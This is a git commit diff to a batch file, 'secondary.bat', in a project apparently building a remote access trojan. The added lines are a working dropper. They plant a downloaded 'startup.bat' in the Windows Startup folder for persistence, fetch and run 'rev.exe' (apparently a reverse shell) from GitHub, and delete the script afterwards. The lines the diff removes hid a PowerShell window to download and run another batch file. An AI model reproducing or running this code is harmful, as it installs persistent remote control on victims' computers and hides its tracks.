ba04635b33bf464482d73281c8569f5b102e40db
saif <saif.aboueldahab@gmail.com>
2023-06-12 00:26:27 +0300

    exe

--- secondary.bat
+++ secondary.bat
@@ -1,4 +1,11 @@
 @echo off
-powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/third.bat -o third.bat
-third.bat
+set "currentd=%cd%"
+
+@rem cd "c:\Program Files\Python310\" && cd %currentd% || curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe & python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+@rem "c:\Program Files\Python310\python.exe" rev.py
+cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+curl -o startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
+cd %currentd%
+curl -o rev.exe https://raw.githubusercontent.com/saifnasef/RAT/main/rev.exe
+rev.exe
 del "%~f0"
